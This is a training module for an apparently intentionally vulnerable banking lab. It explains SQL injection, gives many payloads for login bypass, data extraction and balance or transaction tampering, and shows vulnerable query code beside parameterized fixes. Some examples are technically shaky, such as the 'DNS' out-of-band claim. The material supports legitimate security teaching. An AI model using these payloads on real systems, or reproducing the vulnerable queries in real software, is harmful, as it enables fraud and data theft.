# Module 4: SQL Injection Vulnerabilities

## Understanding SQL Injection

SQL Injection (SQLi) is a critical web security vulnerability that allows attackers to manipulate database queries by injecting malicious SQL code through application inputs. In banking applications, this vulnerability can be particularly devastating, potentially leading to unauthorized access, data theft, and financial fraud.

### How SQL Injection Works

When an application builds SQL queries by concatenating strings with user input, it becomes vulnerable to SQL injection. Consider this simple example:

```python
# Vulnerable query construction
username = "alice"
query = f"SELECT * FROM user WHERE username = '{username}'"
# Results in: SELECT * FROM user WHERE username = 'alice'

# What happens with malicious input?
username = "' OR '1'='1"
query = f"SELECT * FROM user WHERE username = '{username}'"
# Results in: SELECT * FROM user WHERE username = '' OR '1'='1'
```

The attacker's input changes the query's logic from "find user named alice" to "find any user because 1=1 is always true".

### Types of SQL Injection

1. **In-band SQLi (Classic)**
   - **Union Based**: Combines results of malicious query with original query
     ```sql
     ' UNION SELECT username, password FROM user--
     ```
   - **Error Based**: Extracts data through database error messages
     ```sql
     ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--
     ```

2. **Inferential SQLi (Blind)**
   - **Boolean Based**: Infers data by observing true/false responses
     ```sql
     ' AND (SELECT CASE WHEN (username = 'admin') THEN 1 ELSE 0 END) = 1--
     ```
   - **Time Based**: Infers data by observing response delays
     ```sql
     ' AND (SELECT CASE WHEN (username = 'admin') 
         THEN randomblob(100000000) ELSE randomblob(1) END)--
     ```

3. **Out-of-band SQLi**
   - Uses external channels to extract data
   - Example: Making DNS requests with extracted data
     ```sql
     ' AND (SELECT load_extension(
         (SELECT hex(group_concat(password)) FROM user)
     ))--
     ```

### Common Attack Techniques

1. **Authentication Bypass**
   ```sql
   -- Basic bypass
   ' OR '1'='1
   
   -- Comment-based bypass
   admin'--
   
   -- Union-based bypass
   ' UNION SELECT 'admin', 'hash', 1--
   ```

2. **Data Extraction**
   ```sql
   -- Extract table names
   ' UNION SELECT name, NULL FROM sqlite_master WHERE type='table'--
   
   -- Extract column names
   ' UNION SELECT sql, NULL FROM sqlite_master WHERE name='user'--
   
   -- Extract user data
   ' UNION SELECT username, password_hash FROM user--
   ```

3. **Database Manipulation**
   ```sql
   -- Insert new records
   '; INSERT INTO user VALUES ('hacker','hash',999999)--
   
   -- Update records
   '; UPDATE user SET balance=1000000 WHERE username='alice'--
   
   -- Delete records
   '; DELETE FROM transactions WHERE user_id=1--
   ```

### SQLite-Specific Techniques

1. **SQLite System Tables**
   ```sql
   -- List all tables
   ' UNION SELECT name, NULL FROM sqlite_master--
   
   -- Get table schema
   ' UNION SELECT sql, NULL FROM sqlite_master--
   ```

2. **SQLite Functions**
   ```sql
   -- String manipulation
   ' AND substr((SELECT password FROM user LIMIT 1),1,1)='a'--
   
   -- Time-based attacks
   ' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) 
       ELSE randomblob(1) END)--
   ```

3. **SQLite Type Exploitation**
   ```sql
   -- Type coercion
   ' AND typeof((SELECT balance FROM user LIMIT 1))='integer'--
   
   -- CAST exploitation
   ' AND CAST((SELECT password FROM user) AS INTEGER)--
   ```

## Overview

SQL Injection vulnerabilities in DVBank Lab exist in multiple critical endpoints, including user authentication, registration, and transaction processing. This module examines these vulnerabilities and their potential impact on banking operations.

## Vulnerable Endpoints

### 1. User Login
**Location**: `backend/routes/auth_routes.py`
```python
# Vulnerable: Direct string interpolation in login query
query = f"SELECT * FROM user WHERE username = '{username}'"
user = db.session.execute(query).fetchone()
```

**Attack Vectors**:
```sql
-- Basic Authentication Bypass
username: ' OR '1'='1' --
password: anything

-- Union-Based Attack (Extract all users)
username: ' UNION SELECT * FROM user --
password: anything

-- Extract specific user
username: alice' AND '1'='1
password: anything
```

### 2. User Registration
**Location**: `backend/routes/auth_routes.py`
```python
# Vulnerable: String concatenation in registration
insert_query = f"INSERT INTO user (username, password_hash, balance) VALUES ('{username}', '{password_hash}', 0000.00)"
db.session.execute(insert_query)
```

**Attack Vectors**:
```sql
-- Create admin user with high balance
username: admin', 'hash', 1000000) --
password: anything

-- Modify other user's data
username: alice', 'newhash', 999999), ('bob
password: anything
```

### 3. Transaction Processing
**Location**: `backend/routes/transaction_routes.py`
```python
# Vulnerable: Unparameterized transaction query
query = f"SELECT * FROM transactions WHERE user_id = {user_id}"
transactions = db.session.execute(query).fetchall()
```

**Attack Vectors**:
```sql
-- View all transactions
user_id: 1 OR 1=1

-- Union attack to see other users' transactions
user_id: 1 UNION SELECT * FROM transactions

-- Modify transaction amounts
user_id: 1; UPDATE transactions SET amount = 1000000 WHERE id = 1--
```

## Impact Analysis

### Authentication Bypass Impact
- Unauthorized account access
- Identity theft
- Account takeover
- Privilege escalation

### Registration Manipulation Impact
- Creation of unauthorized accounts
- Balance manipulation
- Database corruption
- System compromise

### Transaction Attack Impact
- Unauthorized fund transfers
- Transaction history manipulation
- Financial fraud
- Audit trail tampering

## Detection Techniques

### 1. Manual Testing
Test each endpoint with these payloads:
```sql
-- Basic tests
' OR '1'='1
1 OR 1=1
' UNION SELECT NULL--

-- Error-based tests
' AND 1=convert(int,@@version)--
' AND 1=cast((SELECT @@version) as int)--

-- Time-based tests
'; WAITFOR DELAY '0:0:5'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### 2. Automated Testing
Use tools like:
- SQLmap with identified endpoints
- OWASP ZAP SQL Injection scanner
- Burp Suite's scanner

## Prevention Methods

### 1. Use Parameterized Queries
```python
# Safe login query
query = "SELECT * FROM user WHERE username = :username"
user = db.session.execute(query, {'username': username}).fetchone()

# Safe registration
query = "INSERT INTO user (username, password_hash, balance) VALUES (:username, :password_hash, :balance)"
db.session.execute(query, {
    'username': username,
    'password_hash': password_hash,
    'balance': 0
})

# Safe transaction query
query = "SELECT * FROM transactions WHERE user_id = :user_id"
transactions = db.session.execute(query, {'user_id': user_id}).fetchall()
```

### 2. Input Validation
```python
def validate_username(username):
    if not isinstance(username, str):
        return False
    if not username.isalnum():
        return False
    if len(username) > 30:
        return False
    return True

def validate_transaction_id(id):
    try:
        id = int(id)
        return id > 0
    except ValueError:
        return False
```

### 3. Use ORM
```python
# Using SQLAlchemy ORM
user = User.query.filter_by(username=username).first()
transaction = Transaction.query.get(transaction_id)
```

## Exercises

1. **Authentication Bypass**
   - Try logging in with SQL injection payloads
   - Extract user credentials using UNION attacks
   - Implement proper parameterization

2. **Registration Exploitation**
   - Create users with manipulated balances
   - Attempt to modify existing users
   - Fix the registration endpoint

3. **Transaction Analysis**
   - Extract all transactions using injection
   - Modify transaction records
   - Implement secure transaction queries

## Additional Resources

1. [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
2. [SQLite Injection Techniques](https://www.sqlite.org/security.html)
3. [SQLAlchemy Security Considerations](https://docs.sqlalchemy.org/en/14/core/security.html)

⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments. 